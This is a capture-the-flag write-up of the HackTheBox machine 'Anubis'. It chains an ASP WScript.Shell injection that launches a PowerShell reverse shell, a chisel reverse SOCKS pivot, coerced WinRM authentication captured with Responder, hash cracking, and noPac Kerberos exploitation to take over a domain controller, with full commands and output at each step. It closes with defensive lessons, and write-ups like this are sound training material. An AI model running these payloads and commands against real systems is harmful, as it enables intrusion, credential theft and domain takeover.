# HTB: Anubis

**Difficulty:** Hard
**OS:** Windows (containerized web tier + external AD environment)
**Target IP:** 10.129.230.170
**Attacker IP:** 10.10.15.146
**Domain:** windcorp.htb

---

## 1. Reconnaissance

### Port Scanning

I started with a fast port sweep, then followed up with a detailed service scan.

```bash
rustscan -a 10.129.230.170
```

```
Open 10.129.230.170:135
Open 10.129.230.170:445
Open 10.129.230.170:443
Open 10.129.230.170:593
Open 10.129.230.170:49723
```

```bash
nmap -p135,445,443,593,49723 10.129.230.170 -sCV -T4 -oA nmap/nmap
```

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
443/tcp   open  ssl/https?
| ssl-cert: Subject: commonName=www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
|_ssl-date: 2026-08-15T16:37:25+00:00; +16h05m04s from scanner time.
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49723/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 16h05m07s, deviation: 4s, median: 16h05m03s
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

The TLS certificate immediately told me the real domain I was dealing with: **`www.windcorp.htb`**. I added that to `/etc/hosts` right away, since a Windows box presenting a domain-branded cert like this almost always means the actual site expects to be reached by that hostname rather than the bare IP. I also noted `smb2 message signing enabled and required` — that ruled out SMB relay attacks against this host specifically before I'd even tried anything, so I didn't waste time chasing that path later.

---

## 2. Web Enumeration and Exploitation — Foothold

### 2.1 Finding XSS in the Contact Form

Browsing `https://www.windcorp.htb/`, I found a contact form. I tested the message body with a basic payload:

```html
<script>alert('XSS')</script>
```

It reflected straight back to me — confirming a **reflected XSS**. On its own this isn't very useful against a Windows host with no obvious admin browsing the page, so I kept looking rather than trying to weaponize it directly.

### 2.2 Finding the Real Vulnerability — the Preview Endpoint

While exploring the site I noticed the message preview was rendered by a page at `https://www.windcorp.htb/preview.asp`. That extension told me the backend is **classic ASP**, not ASP.NET MVC or Razor — and classic ASP pages execute anything between `<% ... %>` tags as server-side VBScript at request time. Given that this is exactly the same input path I'd just proven reflects my input unfiltered (the XSS test above), I suspected the preview mechanism wasn't just reflecting my text into HTML — it was very likely writing my submitted content into a location that then gets parsed and *executed* as ASP, rather than just displayed. That would explain why a contact-form preview needed its own dedicated `.asp` file in the first place.

I built a payload using that assumption — real ASP script tags containing a call to `WScript.Shell`, which is the classic ASP mechanism for spawning OS-level processes from server-side script:

```asp
<%
Set oShell = Server.CreateObject("WScript.Shell")
oShell.Run "powershell -e <base64-encoded-payload>"
%>
```

The Base64 blob decodes to a PowerShell TCP reverse shell (Nishang-style), pointed back at my attacker IP and port 4444.

### 2.3 Confirming the Shell

```bash
rlwrap nc -lvnp 4444
```

```
connect to [10.10.15.146] from (UNKNOWN) [10.129.230.170] 49929

EVIL > whoami
nt authority\system
```

My theory was right — the preview functionality really was executing my submitted ASP code server-side, and it did so with **SYSTEM**-level privileges. ✅ Foothold obtained.

### 2.4 Realizing I Was in a Container

```powershell
cd C:\Users
dir
```

```
    Directory: C:\Users

d-----         4/9/2021  10:36 PM                Administrator
d-----        5/25/2021  12:05 PM                ContainerAdministrator
d-----         4/9/2021  10:37 PM                ContainerUser
d-r---         4/9/2021  10:36 PM                Public
```

The presence of `ContainerAdministrator` and `ContainerUser` — accounts that don't exist on a normal, non-containerized Windows install — told me immediately that this web tier is actually running **inside a Windows container**, not directly on the real host. Being SYSTEM here doesn't necessarily mean I'm SYSTEM on anything that actually matters outside the container boundary, so I treated this as a starting point for pivoting rather than the end goal.

### 2.5 A Certificate Signing Request on Administrator's Desktop

```powershell
cd Desktop
dir
type req.txt
```

```
-----BEGIN CERTIFICATE REQUEST-----
...
-----END CERTIFICATE REQUEST-----
```

I copied this out and inspected it locally, since `openssl` can parse a PEM-encoded CSR without needing any of the target's own tooling:

```bash
openssl req -in req.txt -text -noout
```

```
Subject: C=AU, ST=Some-State, O=WindCorp, CN=softwareportal.windcorp.htb
Public-Key: (2048 bit)
```

This was informative even though I didn't act on it immediately: it confirmed **`softwareportal.windcorp.htb`** as another real internal hostname (a CSR is generated for a specific hostname/service that intends to request a signed certificate from an internal Certificate Authority), and it told me WindCorp runs their own internal CA — Active Directory Certificate Services is a very plausible part of this environment. I made a mental note of the hostname and moved on, since a raw CSR sitting on disk isn't directly exploitable by itself without a way to get it signed or without existing CA access.

---

## 3. Pivoting Into the Internal Network

### 3.1 Identifying the Internal Subnet

```powershell
ipconfig
```

```
Ethernet adapter vEthernet (Ethernet):
   IPv4 Address. . . . . . . . . . . : 172.19.129.133
   Subnet Mask . . . . . . . . . . . : 255.255.240.0
   Default Gateway . . . . . . . . . : 172.19.128.1
```

This confirmed what the container evidence already implied: the box I landed on sits on its own internal virtual network (`172.19.128.0/20`), separate from the `10.129.x.x` range I'd been scanning. The default gateway, `172.19.128.1`, was my best candidate for the actual Windows host underneath the container (or another significant machine on that network) — gateways in these container/NAT setups are very often the host machine itself.

### 3.2 Setting Up a Chisel Pivot

I uploaded `chisel.exe` to the container and used it to build a **reverse SOCKS proxy** back to my attacker machine — this was necessary because the `172.19.128.0/20` network isn't routable from my Kali box directly; my only path into it is through the shell I already have on this container.

On the target:

```powershell
C:\Programdata\chisel.exe client 10.10.15.146:8000 R:socks
```

On my attacker machine:

```bash
chisel server -p 8000 --reverse
```

```
server: Reverse tunnelling enabled
server: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

Because I used chisel's **reverse** mode, the container initiates the connection *outbound* to me — this matters because it means I don't need any inbound port opened on the target, I just need the target to be able to reach my IP on port 8000, which it already could since I'd already gotten a reverse shell the same way. Once connected, chisel gives me a local SOCKS5 proxy on `127.0.0.1:1080` that tunnels traffic through the container and out onto its internal network — which I used with `proxychains4` for everything from here on.

### 3.3 Scanning the Internal Network

```bash
proxychains4 nmap -p80,88,389,445 -sT 172.19.128.1
```

```
PORT    STATE SERVICE
80/tcp  open  http
88/tcp  open  kerberos-sec
389/tcp open  ldap
445/tcp open  microsoft-ds
```

Kerberos (88) and LDAP (389) alongside SMB confirmed `172.19.128.1` is a real **Active Directory Domain Controller** — not just a router. This is the actual `windcorp.htb` domain environment sitting behind the containerized web tier.

### 3.4 Finding the Software Portal

```bash
proxychains4 -q curl -I http://softwareportal.windcorp.htb
```

```
HTTP/1.1 200 OK
Server: Microsoft-IIS/10.0
X-Powered-By: ASP.NET
```

This matched the hostname I'd already picked up from the CSR earlier — confirming that lead was worth keeping. Pulling the full page revealed WindCorp's internal software self-service portal, with links like:

```
http://softwareportal.windcorp.htb/install.asp?client=172.19.129.133&software=7z1900-x64.exe
http://softwareportal.windcorp.htb/install.asp?client=172.19.129.133&software=VNC-Viewer-6.20.529-Windows.exe
```

The page copy even says outright: *"The fact that you are not local administrator anymore, will not be a hinder for you getting the software you need installed!"* — which told me plainly that this portal performs **privileged installs on behalf of the requesting client**, driven by the `client` parameter.

---

## 4. Coercing Authentication for a Crackable Hash

### 4.1 The Idea

The `client` parameter in `install.asp` is exactly the kind of thing worth testing for **server-side coerced authentication**: if this portal genuinely "installs software to a client," the logic behind it almost certainly needs to reach out and authenticate to that client machine (over SMB or WinRM) to actually push and run the installer. If I supply *my own* IP as the `client` value instead of a real workstation's IP, the portal's backend service account should try to authenticate to me — and if I have a listener capturing that authentication attempt, I get a crackable hash for whatever account is running the install logic.

### 4.2 Triggering It

```bash
proxychains4 -q curl 'http://softwareportal.windcorp.htb/install.asp?client=10.10.15.146&software=VNC-Viewer-6.20.529-Windows.exe'
```

```
<center><h1>Starting installation of VNC-Viewer-6.20.529-Windows.exe<br>
```

I pointed `client` at my real attacker IP (not the chisel tunnel's internal address) — this matters because the portal's own outbound authentication attempt needs to reach a listener I actually control directly, not one buried behind the reverse tunnel.

### 4.3 Capturing the Hash

I had Responder running on my own interface, listening for exactly this kind of inbound authentication attempt. My theory paid off:

```
[WinRM] NTLMv2 Client   : 10.129.230.170
[WinRM] NTLMv2 Username : windcorp\localadmin
[WinRM] NTLMv2 Hash     : localadmin::windcorp:1122334455667788:...
```

The install logic authenticates over **WinRM**, using a domain account, `windcorp\localadmin` — confirming this backend runs as a real, named domain account rather than a generic service identity, and that account tried to log into "my machine" (since I'd told it that's who the client was) to push the install, handing Responder a full NetNTLMv2 challenge/response in the process.

### 4.4 Cracking the Hash

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

```
Secret123        (localadmin)
```

`localadmin`'s password, `Secret123`, cracked quickly against `rockyou.txt` — a weak, dictionary-guessable password behind an account with "admin" right in the name.

---

## 5. Domain Enumeration and Privilege Escalation

### 5.1 Confirming Domain Access

```bash
proxychains4 nxc smb 172.19.128.1 -d windcorp.htb -u localadmin -p 'Secret123' --shares
```

```
SMB    172.19.128.1    445    EARTH    [*] Windows 10 / Server 2019 Build 17763 x64 (name:EARTH) (domain:windcorp.htb)
SMB    172.19.128.1    445    EARTH    [+] windcorp.htb\localadmin:Secret123
SMB    172.19.128.1    445    EARTH    Share           Permissions     Remark
SMB    172.19.128.1    445    EARTH    CertEnroll      READ            Active Directory Certificate Services share
SMB    172.19.128.1    445    EARTH    Shared          READ,WRITE
```

This confirmed `localadmin:Secret123` is valid against the real domain, and gave me the DC's actual hostname, **EARTH**. The `CertEnroll` share also confirmed my earlier suspicion from the CSR — this domain does run **Active Directory Certificate Services**, though I didn't end up needing to pursue that path further given what I found next.

### 5.2 Checking for noPac

Since I had a valid, if low-privileged, domain credential, I checked for one of the more reliable modern AD escalation paths — the **noPac** vulnerability (a combination of CVE-2021-42278 and CVE-2021-42287). This chain works because Windows Server, by default, lets any authenticated domain user create up to `ms-DS-MachineAccountQuota` new computer accounts (10, by default) — and a bug in how the KDC validated `sAMAccountName` changes on those computer accounts meant an attacker could rename a newly created machine account to match the Domain Controller's own name (minus the trailing `$`), then request a Kerberos ticket that the KDC would treat as if it belonged to the actual DC. Combined with a separate flaw letting an attacker request a **ticket without a PAC** (the structure normally used to validate group membership/privileges), this lets an attacker impersonate any account — including Domain Admin — via Kerberos S4U2Self, entirely through legitimate-looking ticket requests.

```bash
proxychains4 nxc smb 172.19.128.1 -d windcorp.htb -u localadmin -p 'Secret123' -M nopac
```

```
NOPAC       172.19.128.1    445    EARTH    TGT with PAC size 1480
NOPAC       172.19.128.1    445    EARTH    TGT without PAC size 715
NOPAC       172.19.128.1    445    EARTH    VULNERABLE
```

The DC returned a smaller ticket size for the "without PAC" request compared to the normal "with PAC" request — this size difference is exactly what confirms the KDC isn't properly rejecting or validating PAC-less tickets, meaning the vulnerability is present and exploitable with nothing more than my existing low-privileged domain credentials.

### 5.3 Exploiting noPac

```bash
proxychains4 python3 noPac.py windcorp.htb/localadmin:Secret123 -dc-ip 172.19.128.1 -dc-host EARTH -shell --impersonate administrator
```

```
[*] Current ms-DS-MachineAccountQuota = 10
[*] Adding Computer Account "WIN-QMSFTP046A3$"
[*] MachineAccount "WIN-QMSFTP046A3$" password = 9%T6o7g2g$RR
[*] WIN-QMSFTP046A3$ sAMAccountName == EARTH
[*] Saving a DC's ticket in EARTH.ccache
[*] Impersonating administrator
[*]     Requesting S4U2self
[*] Saving a user's ticket in administrator.ccache
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system
```

Walking through what actually happened here: the tool used my `localadmin` credentials — which have ordinary user rights, nothing special — to create a brand-new computer account (`WIN-QMSFTP046A3$`), which is allowed by default because of the machine account quota. It then temporarily renamed that new computer account's `sAMAccountName` to `EARTH` (matching the real DC, without the trailing `$`), requested a Kerberos TGT under that name, and — because of the underlying KDC validation flaw — was able to get that ticket treated as legitimately belonging to the Domain Controller itself. From there, it used that ticket to perform an S4U2Self request impersonating `administrator`, which the KDC honored because the ticket appeared to come from a machine (the DC) that's inherently trusted to make such requests. The tool then dropped the fake computer account's name back to its original value and used the resulting Administrator-impersonating ticket to open a shell directly.

✅ **Full compromise of `EARTH.windcorp.htb`, running as `nt authority\system`.**

---

## 6. Summary

| Stage | Technique |
|-------|-----------|
| Recon | `rustscan` + `nmap` → IIS on a Windows host branded `www.windcorp.htb` |
| Web foothold | Confirmed reflected XSS in a contact form, then recognized `preview.asp` executes submitted content as classic ASP — crafted an ASP `WScript.Shell` payload → reverse shell as SYSTEM |
| Environment discovery | Recognized `ContainerAdministrator`/`ContainerUser` accounts as proof the web tier runs inside a Windows container, separate from the real domain |
| Lead discovery | Found a CSR for `softwareportal.windcorp.htb` on the Administrator desktop, hinting at an internal CA and a second internal hostname |
| Pivoting | Used `ipconfig` to find the internal `172.19.128.0/20` subnet, then built a reverse SOCKS tunnel with `chisel` to route traffic through the container onto that network |
| Internal discovery | Found the software self-service portal (`softwareportal.windcorp.htb`) whose `install.asp?client=` parameter drives server-initiated authentication to a client-supplied IP |
| Coerced auth | Pointed `client` at my own IP and caught the resulting **WinRM NTLMv2** authentication with Responder, capturing `windcorp\localadmin`'s hash |
| Credential recovery | Cracked the hash offline with John/rockyou → `Secret123` |
| Domain compromise | Confirmed the DC (`EARTH`) and its default `MachineAccountQuota`; exploited **noPac** (CVE-2021-42278 + CVE-2021-42287) using the low-privileged `localadmin` credential to impersonate Administrator directly via Kerberos → SYSTEM on the DC |

**Root cause / lessons learned:**
- Classic ASP "preview" functionality that reflects user input needs to treat that input strictly as data, never as executable script — the whole vulnerability chain started because submitted content was interpretable as live ASP code.
- Container boundaries aren't a security boundary by themselves — SYSTEM inside a container was only the beginning here, not the goal, and the container's network configuration (its gateway, its internal subnet) is exactly what let me reach the real domain in the first place.
- Any service that performs "install/push to a client IP" style functionality is a coerced-authentication risk by design — the receiving side needs to authenticate itself to prove it's a legitimate destination *before* the server does, not the other way around, and definitely shouldn't blindly trust an arbitrary `client` request parameter.
- `localadmin`'s weak, dictionary-crackable password (`Secret123`) turned a captured hash into a usable domain credential in seconds — password complexity requirements exist precisely to prevent this step from being trivial.
- Leaving `ms-DS-MachineAccountQuota` at its default (10) combined with an unpatched KDC gave any authenticated low-privileged user a path straight to Domain Admin via noPac — patching CVE-2021-42278/CVE-2021-42287 and reducing the machine account quota to 0 for standard users both close this off.

---

## 7. Tools Used

- `rustscan`, `nmap` — reconnaissance (external and, later, internal via proxychains)
- Classic ASP `WScript.Shell` payload — initial code execution via the `preview.asp` endpoint
- Nishang-style Base64 PowerShell reverse shell — foothold callback
- `openssl req` — inspecting the recovered CSR
- `chisel` — reverse SOCKS5 tunnel to pivot onto the internal `172.19.128.0/20` network
- `proxychains4` — routing all internal tooling through the chisel tunnel
- `curl` — enumerating and triggering the software portal's `install.asp` endpoint
- **Responder** — capturing the coerced WinRM NTLMv2 authentication
- `john` (rockyou.txt) — cracking the captured hash
- `netexec` (`nxc`) — domain/share enumeration and the `nopac` module for vulnerability confirmation
- **noPac** (`noPac.py`, https://github.com/Ridter/noPac) — exploiting CVE-2021-42278/CVE-2021-42287 for full domain compromise
